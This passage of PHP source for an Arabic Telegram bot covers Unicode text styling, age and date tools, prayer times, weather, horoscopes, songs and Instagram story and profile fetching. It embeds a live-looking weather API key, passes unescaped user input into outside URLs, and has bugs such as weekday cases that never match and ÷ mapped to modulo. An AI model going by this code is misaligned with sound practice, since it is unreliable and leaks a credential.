  	 $EN10 = str_replace('r', 'Ɽ' ,$EN10);
	 $EN10 = str_replace('t', 'Ͳ' ,$EN10);
  	 $EN10 = str_replace('y', 'Ỿ' ,$EN10);
	 $EN10 = str_replace('u', 'Ʊ' ,$EN10);
  	 $EN10 = str_replace('i', 'ị' ,$EN10);
	 $EN10 = str_replace('o', 'Ỗ' ,$EN10);
  	 $EN10 = str_replace('p', 'Ꝓ' ,$EN10);
	 $EN10 = str_replace('a', 'Λ' ,$EN10);
  	 $EN10 = str_replace('s', 'Ṥ' ,$EN10);
	 $EN10 = str_replace('d', 'δ' ,$EN10);
  	 $EN10 = str_replace('f', 'Բ' ,$EN10);
	 $EN10 = str_replace('g', '₲' ,$EN10);
  	 $EN10 = str_replace('h', 'Ḩ' ,$EN10);
	 $EN10 = str_replace('j', 'Ĵ' ,$EN10);
  	 $EN10 = str_replace('k', 'Ҡ' ,$EN10);
	 $EN10 = str_replace('l', 'Ⱡ' ,$EN10);
  	 $EN10 = str_replace('z', 'Ꙃ' ,$EN10);
	 $EN10 = str_replace('x', 'Ӿ' ,$EN10);
  	 $EN10 = str_replace('c', 'Ƈ' ,$EN10);
	 $EN10 = str_replace('v', 'Ѵ' ,$EN10);
  	 $EN10 = str_replace('b', 'ß' ,$EN10);
  	 $EN10 = str_replace('n', 'ⴂ' ,$EN10);
	 $EN10 = str_replace('m', 'ⴅ' ,$EN10);
    bot('sendmessage',[
    'chat_id'=>$chat_id,
    'text'=>$EN10[1],

    ]);
    }
 $EN11 = explode("/z", $text);
    if($EN11[1]){
	 $EN11 = str_replace('q', '꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭ǫ꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭' , $EN11);
  	 $EN11 = str_replace('w', '꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭ᴡ꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭' , $EN11);
	 $EN11 = str_replace('e', '꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭ᴇ꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭' , $EN11);
  	 $EN11 = str_replace('r', '꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭ʀ꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭' , $EN11);
	 $EN11 = str_replace('t', '꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭ᴛ꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭' , $EN11);
  	 $EN11 = str_replace('y', '꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭ʏ꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭' , $EN11);
	 $EN11 = str_replace('u', '꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭ᴜ꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭' , $EN11);
  	 $EN11 = str_replace('i', '꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭ɪ꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭' , $EN11);
	 $EN11 = str_replace('o', '꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭ᴏ꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭' , $EN11);
  	 $EN11 = str_replace('p', '꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭ᴘ꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭' , $EN11);
	 $EN11 = str_replace('a', '꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭ᴀ꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭' , $EN11);
  	 $EN11 = str_replace('s', '꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭ѕ꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭' , $EN11);
	 $EN11 = str_replace('d', '꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭ᴅ꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭' , $EN11);
  	 $EN11 = str_replace('f', '꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭ғ꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭' , $EN11);
	 $EN11 = str_replace('g', '꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭ɢ꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭' , $EN11);
  	 $EN11 = str_replace('h', '꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭ʜ꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭' , $EN11);
	 $EN11 = str_replace('j', '꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭ᴊ꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭' , $EN11);
  	 $EN11 = str_replace('k', '꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭ᴋ꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭' , $EN11);
	 $EN11 = str_replace('l', '꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭ʟ꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭' , $EN11);
	 $EN11 = str_replace('z', '꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭z꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭' , $EN11);
	 $EN11 = str_replace('x', '꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭х꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭' , $EN11);
  	 $EN11 = str_replace('c', '꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭ᴄ꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭' , $EN11);
	 $EN11 = str_replace('v', '꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭ᴠ꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭' , $EN11);
  	 $EN11 = str_replace('b', '꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭ʙ꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭' , $EN11);
  	 $EN11 = str_replace('n', '꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭ɴ꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭' , $EN11);
	 $EN11 = str_replace('m', '꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭ᴍ꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭' , $EN11);
	 bot('sendmessage',[
    'chat_id'=>$chat_id,
    'text'=>$EN11[1],

    ]);
    }
 $EN12 = explode("/z", $text);
    if($EN12[1]){
	 $EN12 = str_replace('q', 'Ｑ' , $EN12);
  	 $EN12 = str_replace('w', 'Ｗ' , $EN12);
	 $EN12 = str_replace('e', 'Ｅ' , $EN12);
  	 $EN12 = str_replace('r', 'Ｒ' , $EN12);
	 $EN12 = str_replace('t', 'Ｔ' , $EN12);
  	 $EN12 = str_replace('y', 'Ｙ' , $EN12);
	 $EN12 = str_replace('u', 'Ｕ' , $EN12);
  	 $EN12 = str_replace('i', 'Ｉ' , $EN12);
	 $EN12 = str_replace('o', 'Ｏ' , $EN12);
  	 $EN12 = str_replace('p', 'Ｐ' , $EN12);
	 $EN12 = str_replace('a', 'Ａ' , $EN12);
  	 $EN12 = str_replace('s', 'Ｓ' , $EN12);
	 $EN12 = str_replace('d', 'Ｄ' , $EN12);
  	 $EN12 = str_replace('f', 'Բ' , $EN12);
	 $EN12 = str_replace('g', 'Ｇ' , $EN12);
  	 $EN12 = str_replace('h', 'Ｈ' , $EN12);
	 $EN12 = str_replace('j', 'Ｊ' , $EN12);
  	 $EN12 = str_replace('k', 'Ｋ' , $EN12);
	 $EN12 = str_replace('l', 'Ｌ' , $EN12);
  	 $EN12 = str_replace('z', 'Ｚ' , $EN12);
	 $EN12 = str_replace('x', 'Ｘ' , $EN12);
  	 $EN12 = str_replace('c', 'С' , $EN12);
	 $EN12 = str_replace('v', 'Ｖ' , $EN12);
  	 $EN12 = str_replace('b', 'Ｂ' , $EN12);
  	 $EN12 = str_replace('n', 'Ｎ' , $EN12);
	 $EN12 = str_replace('m', 'Ⅿ' , $EN12);
	 bot('sendmessage',[
    'chat_id'=>$chat_id,
    'text'=>$EN12[1],
    ]);
    }
 $EN13 = explode("/z", $text);
    if($EN13[1]){
	 $EN13 = str_replace('q', 'Ǫ' , $EN13);
  	 $EN13 = str_replace('w', 'Ш' , $EN13);
	 $EN13 = str_replace('e', 'Ξ' , $EN13);
  	 $EN13 = str_replace('r', 'Я' , $EN13);
	 $EN13 = str_replace('t', '₮' , $EN13);
  	 $EN13 = str_replace('y', 'Џ' , $EN13);
	 $EN13 = str_replace('u', 'Ǚ' , $EN13);
  	 $EN13 = str_replace('i', 'ł' , $EN13);
	 $EN13 = str_replace('o', 'Ф' , $EN13);
  	 $EN13 = str_replace('p', 'ק' , $EN13);
	 $EN13 = str_replace('a', 'Λ' , $EN13);
  	 $EN13 = str_replace('s', 'Ŝ' , $EN13);
	 $EN13 = str_replace('d', 'Ð' , $EN13);
  	 $EN13 = str_replace('f', 'Ŧ' , $EN13);
	 $EN13 = str_replace('g', '₲' , $EN13);
  	 $EN13 = str_replace('h', 'Ḧ' , $EN13);
	 $EN13 = str_replace('j', 'J' , $EN13);
  	 $EN13 = str_replace('k', 'К' , $EN13);
	 $EN13 = str_replace('l', 'Ł' , $EN13);
  	 $EN13 = str_replace('z', 'Ꙃ' , $EN13);
	 $EN13 = str_replace('x', 'Ж' , $EN13);
  	 $EN13 = str_replace('c', 'Ͼ' , $EN13);
	 $EN13 = str_replace('v', 'Ṽ' , $EN13);
  	 $EN13 = str_replace('b', 'Б' , $EN13);
  	 $EN13 = str_replace('n', 'Л' , $EN13);
	 $EN13 = str_replace('m', 'Ɱ' , $EN13);
	 bot('sendmessage',[
    'chat_id'=>$chat_id,
    'text'=>$EN13[1],
    ]);
	  }

$update   = json_decode(file_get_contents('php://input'));
$message  = $update->message;
$from_id  = $message->from->id;
$chat_id  = $message->chat->id;
$text     = $message->text;
$data     = $update->callback_query->data;
$inline   = $update->inline_query->query;
$id       = $update->inline_query->from->id;
$msg_id   = $update->inline_query->inline_message_id;
$username = $update->inline_query->from->username;
$cuser    = $update->callback_query->from->username;
$cid      = $update->callback_query->from->id;
$data     = $update->callback_query->data; 
$inline   = $update->inline_query->query; 
$inlineid       = $update->inline_query->from->id; 
$msg_id   = $update->inline_query->inline_message_id; 
$save = json_decode(file_get_contents('hmsa.json'),true);
date_default_timezone_set('Asia/Damascus');
$today = date("l");
$nmonth = date("m");
$times = date("h:i");
$year = date("Y");

switch ($today) 
{
case "Saturday":  
$today="السبت"; 
break; 
case "Sutoday":  
$today="الأحد"; 
break;  
case "Motoday":  
$today="الاثنين"; 
break; 
case "Tuesday":  
$today="الثلاثاء"; 
break; 
case "Wednesday": 
$today="الأربعاء"; 
break; 
case "Thursday":  
$today="الخميس"; 
break; 
case "Friday":  
$today="الجمعة"; 
break; 
}  
switch ($nmonth){
case 1: $nmonth="يناير/كانون الثاني";
break;
case 2: $nmonth="فبراير/شباط";
break;
case 3: $nmonth="مارس/آذار";
break;
case 4: $nmonth="أبريل/نيسان";
break;
case 5: $nmonth="مايو/آيار";
break;
case 6: $nmonth="يونيو/حزيران";
break;
case 7: $nmonth="يوليو/تموز";
break; 
case 8: $nmonth="أغسطس/آب";
break;
case 9: $nmonth="سبتمبر/أيلول";
break;
case 10: $nmonth="أكتوبر/تشرين الأول";
break;
case 11: $nmonth="نوفمبر/تشرين الثاني";
break;
case 12: $nmonth="ديسمبر/كانون الأول";
break;
} 
if($text == "الشهر" or $text == "/month"){
bot('sendMessage',[
'chat_id'=>$chat_id,'text'=>"🗓 ¦ الشهر { $nmonth }\n📆 ¦ الأسبوع { $today }\n⏰ ¦ الوقت { $times }\n📅 ¦ السنة { $year }",'reply_to_message_id'=>$message->message_id
]);
}
function GetAge($Date,$c){
$hours_in_day = 24;
$minutes_in_hour = 60;
$seconds_in_mins = 60;
$birth_date = new DateTime($Date);
$current_date = new DateTime();
date_default_timezone_set("Asia/Baghdad");
$date = date('n');
$dat = date('j');
$diff = $birth_date->diff($current_date);
$years = $diff->y;
$mn = $diff->m;
$doy = $diff->d;
$months = ($diff->y * 12);
$weeks = floor($diff->days/7); echo "\n";
$days = $diff->days;
$hours = $diff->h + ($diff->days * $hours_in_day);
$mins = $diff->h + ($diff->days * $hours_in_day * $minutes_in_hour);
$seconds = $diff->h + ($diff->days * $hours_in_day * $minutes_in_hour * $seconds_in_mins);
bot('Sendmessage',[
'chat_id'=>$c,
'text'=>" 💘| تم حساب عمرك بالتفصيل،
 
🌻|عمرك هوا الان : $years سـنةه، و $mn اشهر،

📕| مره عله ولادتك : $months. شهر،

📌| مره عله ولادتك : $weeks. اسبوع،

🔖| مره عله ولادتك : $days. يوم،

📮| مره عله ولادتك : $hours. ساعه،

📯| مره عله ولادتك : $mins. دقيقةه،

📆| مره عله ولادتك : $seconds. ثانيةه،
",
]);
}
if($text=="/age" or $text =="/age@wizzaard_bot" and $re){
GetAge($re->text,$chat_id);
}
$re = $message->reply_to_message;
if($text=="/calc" and $re){
$rep0 = str_replace(' ', '' , $re->text);
$rep1 = str_replace('×', '*' , $rep0);
$rep = str_replace('÷', '%' , $rep1);
$rep2 = str_replace('+', '%2B' , $rep);
$cal = json_decode(file_get_contents("http://api.mathjs.org/v4/?expr=".$rep2));
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"الجواب : $cal",
'reply_to_message_id'=>$message_id,
 ]);
 }
 $re = $message->reply_to_message;
if($text=="/joke" or $text =="/joke@wizzaard_bot"){
$jak = json_decode(file_get_contents("http://api.icndb.com/jokes/random"));
$joke = $jak->value->joke;
$sd = str_replace(' ', '%20' , $joke);
$jar = json_decode(file_get_contents("https://translate.yandex.net/api/v1/tr.json/translate?srv=android&uuid=6f4c351f-e58f-48d2-bda6-3cae1bddcbb4&id=e93642f1-1cd7-479e-9f93-08405027060b-9-0&lang=ar&text=".$sd));
$jma = $jar->text;
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"$jma[0]",
'reply_to_message_id'=>$message_id,
 ]);
 }
$elias = file_get_contents("https://prayer-times.info/show_prayertimes_new.php?city_link=cairo");
$aa=explode("مواقيت الصلاة",$elias);
$bb= explode("هجرى:",$aa[1]);
$cc= filter_var($bb[0],FILTER_SANITIZE_STRING);
$ex= explode("هجرى:",$elias);
$exx= explode("الصلاة القادمة",$ex[1]);
$el=explode("باقي:",$elias);
$ell=explode("function",$el[1]);
$zrr= explode("\n",$exx[0]);
//date_hj_mi//
$a= filter_var($zrr[2],FILTER_SANITIZE_STRING);
$b= filter_var($zrr[0],FILTER_SANITIZE_STRING);
$c= filter_var($zrr[1],FILTER_SANITIZE_STRING);
//end_date//
if($text=="صلاة"){
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"✅  | سررت بوجودك 🌸

•🎯 | توجد في البوت التاريخ/هجري||ميلادي
•⏰ | يقوم البوت بتما بدك بخدمة أوقات الصلاة .",
  'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>"الوقت والتاريخ ⏰"], ['text'=>"أوقات الصلاة 🕌"]],
]])]);
}

if($text=="الوقت والتاريخ ⏰"){
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"🗓 ¦ الشهر { $nmonth }\n📆 ¦ الأسبوع { $today }\n⏰ ¦ الوقت { $times }\n📅 ¦ السنة { $year }"
]);
}
if($text=="أوقات الصلاة 🕌"){
$sa= filter_var($ell[0],FILTER_SANITIZE_STRING);
$zrr=trim($sa);
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"أهلا بك عزيزي..🍃🍃
🕌┇إليك أوقات الصلاة حسب التوقيت المحلي 
       لمدينة $cc
"."\n".$zrr
]);
} 
function insta($txt){
$curl = curl_init();
curl_setopt_array($curl, array(
CURLOPT_URL => "https://www.instaloadgram.com/api/get",
CURLOPT_RETURNTRANSFER => true,
CURLOPT_ENCODING => "",
CURLOPT_MAXREDIRS => 10,
CURLOPT_TIMEOUT => 0,
CURLOPT_FOLLOWLOCATION => false,
CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
CURLOPT_CUSTOMREQUEST => "POST",
CURLOPT_POSTFIELDS => 'url='.$txt,
CURLOPT_HTTPHEADER => array(
"Content-Type: application/x-www-form-urlencoded"
),
));
$response = curl_exec($curl);
curl_close($curl);
return json_decode($response)->items[0]->url;
}
if(preg_match('/.*instagram\.com.*/i',$text)){
 bot('sendmessage',[
  'chat_id'=>$chat_id,
    'text'=>"- يرجى الانتظار قليلا من فضلك ، 🔱
- جار التحميل ، قناة البوت ؛ @Wizard_System ،",
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>true,
    ]);
bot('sendphoto',[
 'chat_id'=>$chat_id,
  'photo'=>"$text",
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>true,
    ]);
 bot('sendvideo',[
  'chat_id'=>$chat_id,
   'video'=>insta($text)
    ]);
    }
    
if($text=="/profile" or $text =="/profile@wizzaard_bot" and $re){
$usr = str_replace('@', '' , $re->text);
$info = json_decode(file_get_contents("https://instalkr.com/api/getprofile/$usr"));
$bio = $info->biography;
$name = $info->full_name;
$pic = $info->userpic;
$fol = $info->followed_by_count;
$id = $info->id;
bot('sendphoto',[
'chat_id'=>$chat_id,
'photo'=>"$pic",
'caption'=>"
Name : *$name*
his id : `$id`
Bio : *$bio*
followed by : *$fol*
",
]);
}
if(preg_match('/.*facebook\.com.*/i',$text)){
$fcb = json_decode(file_get_contents("https://www.fbvideodownloader.org/data.php?v=".urlencode($text)));
$usr = $fcb->download_url;
bot('sendvideo',[
  'chat_id'=>$chat_id,
   'video'=>$usr,
    ]);
    }
$loca = $message->location; 
$lon = $loca->longitude; 
$lat = $loca->latitude; 
if($text=="/weather" and $re){
$url = "http://api.openweathermap.org/data/2.5/weather?q=$re->text&appid=de8f6f3e0b7f8a36a3e05f47418643bf";
$res = file_get_contents($url);
$weather = json_decode($res);
$city    = $weather->name; 
$country = $weather->sys->country; 
$desc    = $weather->weather->description; 
$min     = $weather->main->temp_min;
$max    = $weather->main->temp_max; 
$wtemp  = $weather->wind->deg; 
$wspeed  = $weather->wind->speed; 
$long = $weather->coord->lon;  
$latt = $weather->coord->lat; 
bot('sendMessage',[
'chat_id'=>$chat_id ,
'text'=>"_البلد ✈ :- _$country 
_ المدينه 🏠 _:- $city
_درجة الحرارة الصغرى ⛅ _ :- $min 
_ درجه الحرارة العظمى ☀ _ :- $max
_ درجه حراره الهواء 🌌 :-_ $wtemp
_سرعه الهواء ♨ _ $wspeed
_ خط الطول 🌐 :-_ $long
_ دوائر العرض 🌀 :- _ $latt
",
'parse_mode'=>"markdown"
]);
}
$from_id = $message->from->id;
$get_done = file_get_contents('make/ex.txt');
$done = explode("\n", $get_done);
$get_id = file_get_contents('make/make.txt');
$getid = explode("\n", $get_id);
$mid = $message->message_id;
$done = explode("\n", $get_done);
$get_file = file_get_contents('root/zh.php');
$chat_id = $update->callback_query->message->chat->id;
if($text =='تحديث الميزات' and in_array($chat_id,$done) ){
bot('sendmessage',[
'chat_id'=>$chat_id, 
'text'=>"تم تحديث الميزات بنجاح المطور : @J_69_L", 
]);
unlink("bots/$from_id/bot.php");
file_put_contents("bots/$from_id/bot.php", $get_file);
}
if($update->message){
 $message = $update->message;
$message_id = $update->message->message_id;
$username = $message->from->username;
$chat_id = $message->chat->id;
$title = $message->chat->title;
$text = $message->text;
$user = $message->from->username;
$name = $message->from->first_name;
$from_id = $message->from->id;
}
if($update->callback_query){
$data = $update->callback_query->data;
$chat_id = $update->callback_query->message->chat->id;
$title = $update->callback_query->message->chat->title;
$message_id = $update->callback_query->message->message_id;
$name = $update->callback_query->message->chat->first_name;
$user = $update->callback_query->message->chat->username;
$from_id = $chat_id;
}
if($text == "الأبراج" or $text == "الابراج"){
bot('sendmessage',[
      'chat_id'=>$chat_id,
      "text"=>"
      أهلا بك عزيزي في قسم الأبراج 🪐✨
      قم بإختيار برجك الأن 😉💁‍♂ ㅤ
      ",
'reply_to_message_id'=>$message_id,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"🐑 الحمل",'callback_data'=>"الحمل"],['text'=>"🐃 الثور",'callback_data'=>"الثور"],['text'=>"♊ الجوزاء",'callback_data'=>"الجوزاء"]],
[['text'=>"🦀 السرطان",'callback_data'=>"السرطان"],['text'=>"🦁 الاسد",'callback_data'=>"الاسد"],['text'=>"👰 العذراء",'callback_data'=>"العذراء"]],
[['text'=>"⚖ الميزان",'callback_data'=>"الميزان"],['text'=>"🦂العقرب",'callback_data'=>"العقرب"],['text'=>"🏹 القوس",'callback_data'=>"القوس"]],
[['text'=>"🐐 الجدي",'callback_data'=>"الجدي"],['text'=>"🪣 الدلو",'callback_data'=>"الدلو"],['text'=>"🐋 الحوت",'callback_data'=>"الحوت"]],
[['text'=>"سورس ويزرد™",'url'=>"https://t.me/Wizard_system"]],
]])
]);
}
$array = array("الحمل","الثور","الجوزاء","السرطان","الاسد","العذراء","الميزان","العقرب","القوس","الجدي","الدلو","الحوت");
if(in_array($data,$array)){
$get = file_get_contents("https://arabhaz.com/wp/");
$a = explode("<strong>توقعات برج $data </strong>",$get);
$b = explode("<strong>توقعات برج $data عاطفياً</strong>",$a[1]);
$all = strip_tags($b[0]);
$c = explode("<strong>توقعات برج $data مهنياً</strong>",$b[1]);
$h = explode("<strong>توقعات برج $data مهنياً</strong>",$b[0]);
$hby = strip_tags($c[0]);
$d = explode("<strong>توقعات برج $data صحياً</strong>",$c[1]);
$work = strip_tags($d[0]);
$sha = explode('</p></div></div><div
class="mx-1 my-2 d-flex justify-content-between" role="group">',$d[1]);
if($all != null){
$alll = "
⌁︙برج $data
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
التوقعات التي ممكن ان تحدث اليوم لبرجك
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙من الناحية العامة ↫ 
$all
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙عاطفياً ↫
$hby
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
م⌁︙مهنياً ↫
$work
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
م⌁︙صحياً ↫
".strip_tags($sha[0]);
bot('EditMessageText',[
          'chat_id'=>$chat_id,
          'message_id'=>$message_id,
          'text'=>$alll
,'reply_markup'=>json_encode([
    'inline_keyboard'=>[
[['text'=>"🐑 الحمل",'callback_data'=>"الحمل"],['text'=>"🐃 الثور",'callback_data'=>"الثور"],['text'=>"♊ الجوزاء",'callback_data'=>"الجوزاء"]],
[['text'=>"🦀 السرطان",'callback_data'=>"السرطان"],['text'=>"🦁 الاسد",'callback_data'=>"الاسد"],['text'=>"👰 العذراء",'callback_data'=>"العذراء"]],
[['text'=>"⚖ الميزان",'callback_data'=>"الميزان"],['text'=>"🦂العقرب",'callback_data'=>"العقرب"],['text'=>"🏹 القوس",'callback_data'=>"القوس"]],
[['text'=>"🐐 الجدي",'callback_data'=>"الجدي"],['text'=>"🪣 الدلو",'callback_data'=>"الدلو"],['text'=>"الحوت 🐋",'callback_data'=>"الحوت"]],
[['text'=>"™سورس ويزرد",'url'=>"https://t.me/Wizard_system"]],
]]),'parse_mode'=>"MarkDown",
]);
}
}
$re = $message->reply_to_message;
if($text == "/story" and $re){
$story = json_decode(file_get_contents("https://instalkr.com/api/getstories/".$re->text),1);
foreach($story as $number => $json){
if($json['type'] == "image"){
bot('sendphoto',[
 'chat_id'=>$chat_id,
  'photo'=>$json['src']
    ]);
}else{
bot('sendvideo',[
  'chat_id'=>$chat_id,
   'video'=>$json['src']
    ]);
}
}
}
$re = $message->reply_to_message;
if($text == "/story" and $re){
$story = json_decode(file_get_contents("https://instalkr.com/api/getstories/".$re->text),1);
foreach($story as $number => $json){
if($json['type'] == "image"){
bot('sendphoto',[
 'chat_id'=>$chat_id,
  'photo'=>$json['src']
    ]);
}else{
bot('sendvideo',[
  'chat_id'=>$chat_id,
   'video'=>$json['src']
    ]);
}
}
}
#أغاني#
if($text == 'اغاني' || $text == 'الاغاني'){ 
bot('sendMessage',[ 
'chat_id'=>$chat_id, 
'text'=>"
اختر نوع اغنيتك 🎧.                                   
Choose your song type 🎧
. ", 
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>'مصري 🇪🇬','callback_data'=>"song1"],['text'=>'سعودي 🇸🇦','callback_data'=>"song3"]],
[['text'=>'عراقي 🇸🇾','callback_data'=>"song4"],['text'=>'سوري 🇸🇾 ','callback_data'=>"song5"]],
[['text'=>'انجليزي 🇬🇧','callback_data'=>"song2"]],
 [['text'=>'سورس ويزرد ™','url'=>'t.me/wizard_system']],
]
])
]);
}

if($data=="song" ){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>'
اختر نوع اغنيتك 🎧.                                   
Choose your song type 🎧

',
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>'مصري 🇪🇬','callback_data'=>"song1"],['text'=>'سعودي 🇸🇦','callback_data'=>"song3"]],
[['text'=>'عراقي 🇸🇾','callback_data'=>"song4"],['text'=>'سوري 🇸🇾 ','callback_data'=>"song5"]],
[['text'=>'انجليزي 🇬🇧','callback_data'=>"song2"]],
 [['text'=>'سورس ويزرد ™','url'=>'t.me/wizard_system']],
]
])
]);
}
if($data=="song5" ){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>'
اختر مغنيك 🎧
',
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>'علي الديك 🎧','callback_data'=>"diiik"],['text'=>'بهاء اليوسف 🎧','callback_data'=>"sollta"]],
[['text'=>'حسين الديك  🎧','callback_data'=>"krlak"],['text'=>'صباح فخري 🎧','callback_data'=>"yjkam"]],
[['text'=>'جورج وسوف 🎧','callback_data'=>"sjsjkjwl"],['text'=>'ساريا سواس 🎧','callback_data'=>"sozbe"]],
[['text'=>'حسام جنيد 🎧','callback_data'=>"woalah"],['text'=>'احمد ابراهيم 🎧','callback_data'=>"pwosjhe"]],
 [['text'=>'سورس ويزرد ™','url'=>'t.me/wizard_system']],
[['text'=>'𝖇𝖆𝖈𝖐 🔙','callback_data'=>"song"]],
]
])
]);
}
if($data=="pwosjhe" ){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>'
𓆩 قائمه اغاني احمد ابراهيم 𓆪
',
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>' 🎧ولده نار ','callback_data'=>"pwosjhe1"],['text'=>' 🎧ما اصبر من دونك','callback_data'=>"pwosjhe2"]],
[['text'=>'🎧اسمر وبخدو شامه ','callback_data'=>"pwosjhe3"],['text'=>' 🎧جوبي','callback_data'=>"pwosjhe4"]],
[['text'=>'🎧دبكه نشلة ','callback_data'=>"pwosjhe5"],['text'=>'🎧ينعن عينك','callback_data'=>"pwosjhe6"]],
[['text'=>'𝖇𝖆𝖈𝖐 🔙','callback_data'=>"song5"]],
]
])
]);
}



if($data=="pwosjhe1"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/869",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="pwosjhe2"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/870",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="pwosjhe3"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/871",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="pwosjhe4"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/872",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="pwosjhe5"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/873",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="pwosjhe6"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/874",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="woalah" ){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>'
𓆩 قائمه اغاني حسام جنيد 𓆪
',
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>' 🎧جايتني مخباية ','callback_data'=>"woalah1"],['text'=>' 🎧سامحتك','callback_data'=>"woalah2"]],
[['text'=>'🎧بفرح فيكي ','callback_data'=>"woalah3"],['text'=>' 🎧جرحك صعب','callback_data'=>"woalah4"]],
